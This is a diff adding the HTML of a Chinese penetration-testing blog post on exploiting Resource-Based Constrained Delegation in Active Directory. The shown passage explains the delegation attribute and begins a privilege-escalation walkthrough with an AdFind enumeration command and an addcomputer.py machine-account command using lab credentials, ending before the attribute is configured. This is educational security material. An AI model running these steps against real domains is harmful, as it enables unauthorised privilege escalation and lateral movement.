@@ -1,0 +1,630 @@
+<!DOCTYPE html><html dir="ltr" lang="en" class="scroll-smooth" data-astro-cid-sckkx6r4> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><link rel="icon" type="image/png" href="/favicon.png"><link rel="canonical" href="https://exp10it.io/posts/resource-based-constrained-delegation-attack-summary/"><meta name="generator" content="Astro v5.12.0"><!-- General Meta Tags --><title>基于资源的约束委派 (RBCD) 利用总结 | X1r0z Blog</title><meta name="title" content="基于资源的约束委派 (RBCD) 利用总结 | X1r0z Blog"><meta name="description" content="RBCD 常见利用方法以及在 Relay 攻击中的应用"><meta name="author" content="X1r0z"><link rel="sitemap" href="/sitemap-index.xml"><!-- Open Graph / Facebook --><meta property="og:title" content="基于资源的约束委派 (RBCD) 利用总结 | X1r0z Blog"><meta property="og:description" content="RBCD 常见利用方法以及在 Relay 攻击中的应用"><meta property="og:url" content="https://exp10it.io/posts/resource-based-constrained-delegation-attack-summary/"><meta property="og:image" content="https://exp10it.io/og.png"><!-- Article Published/Modified time --><meta property="article:published_time" content="2023-08-01T00:00:00.000Z"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://exp10it.io/posts/resource-based-constrained-delegation-attack-summary/"><meta property="twitter:title" content="基于资源的约束委派 (RBCD) 利用总结 | X1r0z Blog"><meta property="twitter:description" content="RBCD 常见利用方法以及在 Relay 攻击中的应用"><meta property="twitter:image" content="https://exp10it.io/og.png"><!-- Google JSON-LD Structured data --><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"基于资源的约束委派 (RBCD) 利用总结 | X1r0z Blog","image":"https://exp10it.io/og.png","datePublished":"2023-08-01T00:00:00.000Z","author":[{"@type":"Person","name":"X1r0z","url":"https://exp10it.io/"}]}</script><!-- Enable RSS feed auto-discovery  --><!-- https://docs.astro.build/en/recipes/rss/#enabling-rss-feed-auto-discovery --><link rel="alternate" type="application/rss+xml" title="X1r0z Blog" href="https://exp10it.io/rss.xml"><meta name="theme-color" content=""><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/_astro/ClientRouter.astro_astro_type_script_index_0_lang.D98dxaWf.js"></script><script src="/toggle-theme.js"></script><link rel="stylesheet" href="/_astro/about.Cn_dDryL.css">
+<style>@keyframes astroFadeInOut{0%{opacity:1}to{opacity:0}}@keyframes astroFadeIn{0%{opacity:0;mix-blend-mode:plus-lighter}to{opacity:1;mix-blend-mode:plus-lighter}}@keyframes astroFadeOut{0%{opacity:1;mix-blend-mode:plus-lighter}to{opacity:0;mix-blend-mode:plus-lighter}}@keyframes astroSlideFromRight{0%{transform:translate(100%)}}@keyframes astroSlideFromLeft{0%{transform:translate(-100%)}}@keyframes astroSlideToRight{to{transform:translate(100%)}}@keyframes astroSlideToLeft{to{transform:translate(-100%)}}@media (prefers-reduced-motion){::view-transition-group(*),::view-transition-old(*),::view-transition-new(*){animation:none!important}[data-astro-transition-scope]{animation:none!important}}
+:where([data-astro-image]){object-fit:var(--fit);object-position:var(--pos);height:auto}:where([data-astro-image=full-width]){width:100%}:where([data-astro-image=constrained]){max-width:100%}
+</style><style>[data-astro-transition-scope="astro-fam6wyqg-1"] { view-transition-name: \57FA\4E8E\8D44\6E90\7684\7EA6\675F\59D4\6D3E-rbcd-\5229\7528\603B\7ED3; }@layer astro { ::view-transition-old(\57FA\4E8E\8D44\6E90\7684\7EA6\675F\59D4\6D3E-rbcd-\5229\7528\603B\7ED3) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(\57FA\4E8E\8D44\6E90\7684\7EA6\675F\59D4\6D3E-rbcd-\5229\7528\603B\7ED3) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(\57FA\4E8E\8D44\6E90\7684\7EA6\675F\59D4\6D3E-rbcd-\5229\7528\603B\7ED3) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(\57FA\4E8E\8D44\6E90\7684\7EA6\675F\59D4\6D3E-rbcd-\5229\7528\603B\7ED3) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-36ssibgs-2"] { view-transition-name: rbcd; }@layer astro { ::view-transition-old(rbcd) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(rbcd) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(rbcd) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(rbcd) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-36ssibgs-3"] { view-transition-name: ntlm; }@layer astro { ::view-transition-old(ntlm) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(ntlm) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(ntlm) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(ntlm) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-3"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-3"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-3"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-3"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-36ssibgs-4"] { view-transition-name: kerberos; }@layer astro { ::view-transition-old(kerberos) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(kerberos) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(kerberos) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(kerberos) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-4"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-4"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-4"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-4"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-4"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-4"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-4"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-4"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-36ssibgs-5"] { view-transition-name: windows; }@layer astro { ::view-transition-old(windows) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(windows) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(windows) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(windows) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-5"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-5"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-5"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-5"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-5"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-5"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-5"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-5"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style></head> <body data-astro-cid-sckkx6r4>  <header> <a id="skip-to-content" href="#main-content" class="absolute start-16 -top-full z-50 bg-background px-3 py-2 text-accent backdrop-blur-lg transition-all focus:top-4">
+Skip to content
+</a> <div id="nav-container" class="mx-auto flex max-w-app flex-col items-center justify-between sm:flex-row"> <div id="top-nav-wrap" class="relative flex w-full items-baseline justify-between bg-background p-4 sm:items-center sm:py-6"> <a href="/" class="absolute py-1 text-xl leading-8 font-semibold whitespace-nowrap sm:static sm:my-auto sm:text-2xl sm:leading-none"> X1r0z Blog </a> <nav id="nav-menu" class="flex w-full flex-col items-center sm:ms-2 sm:flex-row sm:justify-end sm:space-x-4 sm:py-0"> <button id="menu-btn" class="focus-outline self-end p-2 sm:hidden" aria-label="Open Menu" aria-expanded="false" aria-controls="menu-items"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="hidden" id="close-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M18 6l-12 12" /><path d="M6 6l12 12" /></svg> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-menu-deep" id="menu-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M4 6h16" /><path d="M7 12h13" /><path d="M10 18h10" /></svg> </button> <ul id="menu-items" class="mt-4 grid w-44 grid-cols-2 place-content-center gap-2 [&#38;>li>a]:block [&#38;>li>a]:px-4 [&#38;>li>a]:py-3 [&#38;>li>a]:text-center [&#38;>li>a]:font-medium [&#38;>li>a]:hover:text-accent sm:[&#38;>li>a]:px-2 sm:[&#38;>li>a]:py-1 hidden sm:mt-0 sm:flex sm:w-auto sm:gap-x-5 sm:gap-y-0"> <li class="col-span-2"> <a href="/posts" class="active-nav">
+Posts
+</a> </li> <li class="col-span-2"> <a href="/tags">
+Tags
+</a> </li> <li class="col-span-2"> <a href="/links">
+Links
+</a> </li> <li class="col-span-2"> <a href="/about">
+About
+</a> </li> <li class="col-span-2"> <a href="/archives" class="group inline-block hover:text-accent focus-outline flex justify-center p-3 sm:p-1" aria-label="archives" title="Archives"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="hidden sm:inline-block"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 4m0 2a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v0a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2z" /><path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" /><path d="M10 12l4 0" /></svg> <span class="sm:sr-only">Archives</span> </a> </li> <li class="col-span-1 flex items-center justify-center"> <a href="/search" class="group inline-block hover:text-accent focus-outline flex p-3 sm:p-1" aria-label="search" title="Search"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-search"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg> <span class="sr-only">Search</span> </a> </li> <li class="col-span-1 flex items-center justify-center"> <button id="theme-btn" class="focus-outline relative size-12 p-4 sm:size-8 hover:[&>svg]:stroke-accent" title="Toggles light & dark" aria-label="auto" aria-live="polite"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="absolute top-[50%] left-[50%] -translate-[50%] scale-100 rotate-0 transition-all dark:scale-0 dark:-rotate-90"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" /></svg> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="absolute top-[50%] left-[50%] -translate-[50%] scale-0 rotate-90 transition-all dark:scale-100 dark:rotate-0"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M14.828 14.828a4 4 0 1 0 -5.656 -5.656a4 4 0 0 0 5.656 5.656z" /><path d="M6.343 17.657l-1.414 1.414" /><path d="M6.343 6.343l-1.414 -1.414" /><path d="M17.657 6.343l1.414 -1.414" /><path d="M17.657 17.657l1.414 1.414" /><path d="M4 12h-2" /><path d="M12 4v-2" /><path d="M20 12h2" /><path d="M12 20v2" /></svg> </button> </li> </ul> </nav> </div> </div> <div class="mx-auto max-w-app px-4"> <hr class="border-border" aria-hidden="true"> </div> </header> <script type="module">function s(){const e=document.querySelector("#menu-btn"),t=document.querySelector("#menu-items"),n=document.querySelector("#menu-icon"),o=document.querySelector("#close-icon");!e||!t||!n||!o||e.addEventListener("click",()=>{const c=e.getAttribute("aria-expanded")==="true";e.setAttribute("aria-expanded",c?"false":"true"),e.setAttribute("aria-label",c?"Open Menu":"Close Menu"),t.classList.toggle("hidden"),n.classList.toggle("hidden"),o.classList.toggle("hidden")})}s();document.addEventListener("astro:after-swap",s);</script> <div class="mx-auto flex w-full max-w-app items-center justify-start px-2"><a id="back-button" href="/" class="group inline-block hover:text-accent focus-outline mt-8 mb-2 flex hover:text-foreground/75"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 rtl:rotate-180"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 6l-6 6l6 6" /></svg><span>Go back</span></a></div><script type="module">function o(){const t=document.querySelector("#back-button"),e=sessionStorage.getItem("backUrl");e&&t&&(t.href=e)}document.addEventListener("astro:page-load",o);o();</script> <main id="main-content" class="mx-auto w-full max-w-app px-4 pb-12" data-pagefind-body> <h1 class="inline-block text-2xl font-bold text-accent sm:text-3xl" data-astro-transition-scope="astro-fam6wyqg-1"> 基于资源的约束委派 (RBCD) 利用总结 </h1> <div class="my-2 flex items-center gap-2"> <div class="flex items-center gap-x-2 opacity-80"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 min-w-[1.375rem]"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z" /><path d="M16 3v4" /><path d="M8 3v4" /><path d="M4 11h16" /><path d="M7 14h.013" /><path d="M10.01 14h.005" /><path d="M13.01 14h.005" /><path d="M16.015 14h.005" /><path d="M13.015 17h.005" /><path d="M7.01 17h.005" /><path d="M10.01 17h.005" /></svg>  <time class="text-sm sm:text-base" datetime="2023-08-01T00:00:00.000Z">1 Aug, 2023</time> </div> <span aria-hidden="true" class="max-sm:hidden">|</span> <a href="https://github.com/X1r0z/exp10it.io/edit/master/src/data/pentest/resource-based-constrained-delegation-attack-summary.md" target="_blank" rel="noopener noreferrer" class="flex justify-baseline gap-1.5 opacity-80 hover:text-accent max-sm:hidden"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M7 7h-1a2 2 0 0 0 -2 2v9a2 2 0 0 0 2 2h9a2 2 0 0 0 2 -2v-1" /><path d="M20.385 6.585a2.1 2.1 0 0 0 -2.97 -2.97l-8.415 8.385v3h3l8.385 -8.415z" /><path d="M16 5l3 3" /></svg><span>Edit page</span></a> </div> <article id="article" class="app-prose mx-auto mt-8 max-w-app prose-pre:bg-(--shiki-light-bg) dark:prose-pre:bg-(--shiki-dark-bg)"> <h2 id="table-of-contents">Table of contents</h2>
+<p></p><details><summary>Open Table of contents</summary><p></p>
+<ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D">介绍</a></li>
+<li><a href="#%E5%B8%B8%E8%A7%84%E5%88%A9%E7%94%A8">常规利用</a></li>
+<li><a href="#%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7%E6%8F%90%E6%9D%83">服务账户提权</a></li>
+<li><a href="#rbcd-%E5%90%8E%E9%97%A8">RBCD 后门</a></li>
+<li><a href="#ntlm-relay-to-ldap">NTLM Relay to LDAP</a>
+<ul>
+<li><a href="#smb">SMB</a></li>
+<li><a href="#http">HTTP</a></li>
+<li><a href="#webdav">WebDAV</a></li>
+</ul>
+</li>
+<li><a href="#kerberos-relay-to-ldap">Kerberos Relay to LDAP</a></li>
+</ul>
+<p></p></details><p></p>
+<h2 id="介绍">介绍</h2>
+<p>为了使用户/资源更加独立, Microsoft 在 Windows Server 2012 中引入了基于资源的约束委派 (Resource-Based Constrained Delegation), RBCD 将委派的控制权从拥有 SeEnableDelegation 特权的账户 (一般为域管理员) 转交给被访问的资源</p>
+<p>例如从 Service A 到 Service B 的委派</p>
+<p>传统的约束委派是正向的, 需要以域管的权限将 Service A 的 <code>msDS-AllowedToDelegateTo</code> 属性指定为 Service B</p>
+<p>而基于资源的约束委派则是反向的, 无需域管权限, 只需要在 Service B 上将 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性指定为 Service A, 即可完成委派的配置</p>
+<p>详细参考文章: <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</a></p>
+<p>配置 RBCD 的关键在于 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性, 通常以下用户能够修改此属性</p>
+<ul>
+<li>
+<p>将主机加入域的用户 (机器账户中会有一个 msDS-CreatorSID 属性, 使用非域管账户加入域时才会显示)</p>
+</li>
+<li>
+<p>Account Operators (能修改任意域内非域控机器的委派属性)</p>
+</li>
+<li>
+<p>NT AUTHORITY\SELF (该主机的机器账户)</p>
+</li>
+</ul>
+<p>下面简要总结 RBCD 的常见利用方法以及在 Relay 攻击中的应用</p>
+<h2 id="常规利用">常规利用</h2>
+<p>一般的情况是我们拿到一个域内的普通用户, 并且发现某台机器是通过该用户加入域的, 那么就可以通过 RBCD 在该机器上实现本地提权</p>
+<p>思路:</p>
+<ol>
+<li>利用可控域用户创建一个机器账户 (每个域用户默认可以创建 10 个机器账户, 即 <code>msDS-MachineAccountQuota (MAQ)</code> 属性)</li>
+<li>修改目标主机的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性, 使其指向新创建机器账户的 SID</li>
+<li>利用该机器账户的凭证通过 S4U 协议申请委派至目标主机的 ST 票据, 实现本地提权/横向移动</li>
+</ol>
+<p>通过 AdFind 查询域内机器的 CreatorSID 属性</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">AdFind.exe</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -b</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">DC=hack-my,DC=com</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -f</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">objectClass=computer</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> cn</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> ms-DS-CreatorSID</span></span></code></pre>
+<p><img src="https://img.exp10it.io/img/202308011558298.png" alt="image-20230801155807265"></p>
+<p>可以发现 WIN2008-WEB 这台机器是通过 Alice 加入域的, 那么 Alice 就有权限修改它的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性</p>
+<p>首先利用 Alice 账户在域内添加一个机器账户</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">addcomputer.py</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> hack-my.com/Alice:</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Alice123!</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -computer-name</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> TEST</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\$</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -computer-pass</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 123456</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -dc-host</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> DC.hack-my.com</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -dc-ip</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 192.168.30.10</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB"> </span></span></code></pre>
+<p>然后配置 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性</p>
